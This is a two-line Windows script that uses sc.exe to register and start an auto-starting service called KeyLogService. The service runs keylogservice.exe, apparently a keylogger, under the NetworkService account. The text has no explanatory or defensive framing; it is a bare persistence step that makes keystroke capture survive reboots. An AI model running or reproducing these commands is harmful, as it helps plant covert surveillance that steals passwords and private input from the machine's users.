sc.exe create KeyLogService binpath= "%cd%/keylogservice.exe" start= auto obj= "NT AUTHORITY\NetworkService"
sc.exe start KeyLogService
